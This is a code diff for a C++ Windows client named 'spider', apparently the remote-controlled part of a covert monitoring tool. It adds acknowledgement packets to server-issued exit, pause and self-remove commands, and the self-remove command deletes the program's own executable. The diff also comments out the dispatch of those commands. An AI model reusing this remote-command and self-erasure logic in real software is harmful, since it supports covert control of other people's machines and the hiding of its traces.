@@ -5,6 +5,7 @@
 #include "reseau/Network.hh"
 #include "paquetFirstClient.hh"
 #include "paquetCommandServer.hh"
+#include "paquetCommandClient.hh"
 
 #ifndef CERTIFICATE_FILE
 # define CERTIFICATE_FILE ("client.crt")
@@ -113,24 +114,31 @@ void Network::readLoop()
 	PaquetCommandServer paquet;
 
 	while (!_engine->read(paquet)) {
-		if (paquet.getReponse() > 4)
-			_response[paquet.getReponse()](*this);
+//		if (paquet.getReponse() > 4)
+//			_response[paquet.getReponse()](*this);
 		std::cout << "Paquet recu: " << paquet << std::endl;
 	}
 }
 
 void spider_exit(Network& net) {
+	PaquetCommandClient paquet;
+
+	paquet.setOk(1);
 	std::cout << "Exit spider" << std::endl;
+	paquet.createPaquet();
+	net.getPackager().addPaquet(&paquet);
 	exit(EXIT_SUCCESS);
 }
 
 void spider_remove(Network& net) {
+	PaquetCommandClient paquet;
 	HMODULE		hModule = GetModuleHandle(NULL);
 
 	if (hModule)
 	{
 		WCHAR	path[MAX_PATH];
 
+		paquet.setOk(1);
 		GetModuleFileName(hModule, path, MAX_PATH);
 		std::wstring wpath = path;
 		std::string str(wpath.begin(), wpath.end());
@@ -138,11 +146,20 @@ void spider_remove(Network& net) {
 		if (boost::filesystem::exists(str))
 			boost::filesystem::remove(str);
 	}
+	else
+		paquet.setOk(0);
+	paquet.createPaquet();
+	net.getPackager().addPaquet(&paquet);
 }
 
 void spider_pause(Network& net) {
+	PaquetCommandClient paquet;
+
+	paquet.setOk(1);
 	if (net.getPause() == 0)
 		net.setPause(1);
 	else
 		net.setPause(0);
+	paquet.createPaquet();
+	net.getPackager().addPaquet(&paquet);
 }
